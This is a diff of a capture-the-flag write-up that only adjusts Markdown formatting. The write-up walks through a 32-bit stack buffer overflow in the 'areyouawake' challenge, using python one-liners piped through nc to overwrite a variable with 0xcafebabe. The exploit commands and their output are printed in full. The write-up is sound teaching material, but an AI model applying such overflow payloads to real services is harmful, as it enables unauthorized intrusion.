@@ -161,7 +161,7 @@ $ python -c 'print "A"*143' | nc areyouawake.chals.fuzzy.land 5503
 Are you awake? Nope, you are still sleeping! (0xdeadbe00)
 😴
 ```
-Here we go! We just successfully modified the value from ```0xdeadbeef``` to ```0xdeadbe00```. That's most likely caused by the NULL termination of the C library function ```fgets()``` which reads in our input. The call to function fgets() can be found in the disassembly of the function ```<check_awake>```...
+Here we go! We just successfully modified the value from ```0xdeadbeef``` to ```0xdeadbe00```. That's most likely caused by the [NULL termination](https://stackoverflow.com/questions/2037209/what-is-a-null-terminated-string) of the C library function ```fgets()``` which reads in our input. The call to function ```fgets()``` can be found in the disassembly of the function ```<check_awake>```...
 ```
  8048572:	e8 69 fe ff ff       	call   80483e0 <fgets@plt>
  ```
@@ -187,10 +187,10 @@ $ python -c 'print "A"*148' | nc areyouawake.chals.fuzzy.land 5503
 Are you awake? Nope, you are still sleeping! (0x41414141)
 😴
 ```
-Now we have completely overwritten the variable and therefore replaced the value ```0xdeadbeef``` with our A's which are represented by the ASCII hex code 0x41. 
+Now we have completely overwritten the variable and therefore replaced the value ```0xdeadbeef``` with our A's which are represented by the ASCII hex code ```0x41```. 
 
 In the beginning we found out that the binary is 32 bit. 8 bits are 1 byte. And each one of our A's is 1 byte as well. Therefore 4 A's form a 32 bit address. 
-In order to get the flag, all we have to do is to replace ```0x41414141``` with the previously gathered value ```0xcafebabe```. As mentioned earlier, the binary is little-endian. Therefore we have to store the 4 bytes in reverse order. So 0xca 0xfe 0xba 0xbe becomes 0xbe 0xba 0xfe 0xca:
+In order to get the flag, all we have to do is to replace ```0x41414141``` with the previously gathered value ```0xcafebabe```. As mentioned earlier, the binary is little-endian. Therefore we have to store the 4 bytes in reverse order. So ```0xca``` ```0xfe``` ```0xba``` ```0xbe``` becomes ```0xbe``` ```0xba``` ```0xfe``` ```0xca```:
 ```
 $ python -c 'print "A"*144 + "\xbe\xba\xfe\xca"' | nc areyouawake.chals.fuzzy.land 5503
 Are you awake? Oh, good morning :)
